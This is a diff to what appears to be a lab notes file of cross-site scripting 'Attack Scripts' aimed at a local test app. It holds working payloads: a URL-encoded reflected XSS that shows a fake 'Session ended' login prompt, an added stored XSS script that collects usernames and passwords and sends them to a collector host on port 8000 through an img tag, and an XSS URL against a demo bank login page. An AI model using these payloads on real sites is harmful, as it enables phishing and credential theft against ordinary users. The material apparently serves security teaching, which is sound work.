@@ -11,6 +11,12 @@ Attack Scripts:
 
 4. Phising Attack: http://127.0.0.1:5000/search?input=%3Cscript%3Eemail%3Dprompt%28%27Session+ended.+Login+again.Please+enter+your+username%27%2C%27+%27%29%3B+password%3Dprompt%28%27Please+enter+your+password%27%2C%27+%27%29%3B+read_html+%3D+%27%3Cimg+src%3D%22http%3A%2F%2F127.0.0.1%3A8000%2F%3Femail%3D%27%2Bemail%2B%22%26password%3D%22%2Bpassword%2B%27%22%3E%27%3B+alert%28%22You+are+good+to+go+now%21%22%29%3Bdocument.write%28read_html%29%3B%3C%2Fscript%3E
 
-5. Stored Attack script:
+5. Stored Attack script: <script>
+email=prompt('Session Logout. For Login again, Please enter your username',' '); 
+password=prompt('Please enter your password',' '); 
+read_html = '<img src="http://127.0.0.1:8000/?email='+email+"&password="+password+'">'; 
+alert("You are good to go now!");
+document.write(read_html);
+</script>
 
 http://freebankonline.com/banklogin.asp?err=<script>username=prompt('Please enter your username',' '); password=prompt('Please enter your password',' '); alert("username="+username+" and password="+password);</script>
